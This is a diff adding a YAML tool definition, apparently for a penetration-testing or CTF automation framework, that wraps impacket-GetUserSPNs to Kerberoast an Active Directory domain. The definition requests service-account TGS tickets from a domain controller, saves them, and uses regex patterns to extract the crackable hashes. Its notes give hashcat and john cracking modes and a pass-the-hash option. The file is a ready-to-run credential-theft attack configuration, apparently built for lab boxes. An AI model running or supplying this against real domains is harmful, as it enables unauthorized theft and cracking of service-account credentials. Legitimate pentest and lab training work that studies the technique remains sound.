@@ -1,0 +1,59 @@
+id: impacket-GetUserSPNs
+name: GetUserSPNs (Kerberoast)
+description: List service accounts and get their crackable TGS hashes (needs a domain login)
+category: windows-ad
+safety: exploit
+ports: [88]
+detect:
+  binary: impacket-GetUserSPNs
+  apt: impacket-scripts
+  version_cmd: ["impacket-GetUserSPNs", "-h"]
+  version_regex: 'Impacket v(\S+)'
+  help_cmd: ["impacket-GetUserSPNs", "-h"]
+inputs:
+  domain:
+    from: domain
+    label: Domain
+    help: "AD domain, e.g. box.htb."
+  user:
+    label: Username
+    help: "Any valid domain user."
+  password:
+    label: Password
+    help: "That user's password (it is shown in the command line and job log)."
+  dc_ip:
+    from: target_ip
+    label: DC IP
+    help: "Domain controller (the box)."
+command:
+  - impacket-GetUserSPNs
+  - "{domain}/{user}:{password}"
+  - -dc-ip
+  - "{dc_ip}"
+  - -request
+  - -outputfile
+  - "{out}/kerberoast.txt"
+  - "{extra}"
+timeout: 600
+outputs:
+  - path: "{out}/kerberoast.txt"
+parser: lines_regex
+parser_config:
+  patterns:
+    - regex: '^(?P<value>\$krb5tgs\$23\$\*(?P<user>[^$*]+)\$.+)$'
+      type: hash
+      set: { hashcat_mode: "13100", hash_types: ["Kerberos 5 TGS-REP etype 23"] }
+      tags: [kerberoast]
+      confidence: 1.0
+    - regex: '^(?P<value>\$krb5tgs\$17\$.+)$'
+      type: hash
+      set: { hashcat_mode: "19600", hash_types: ["Kerberos 5 TGS-REP etype 17"] }
+      tags: [kerberoast]
+      confidence: 1.0
+    - regex: '^(?P<value>\$krb5tgs\$18\$.+)$'
+      type: hash
+      set: { hashcat_mode: "19700", hash_types: ["Kerberos 5 TGS-REP etype 18"] }
+      tags: [kerberoast]
+      confidence: 1.0
+notes: "Crack RC4 hashes with hashcat -m 13100 (or john --format=krb5tgs). With an NT hash instead of a password, put the password as anything and add -hashes :<nt> in Extra args."
+learn: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
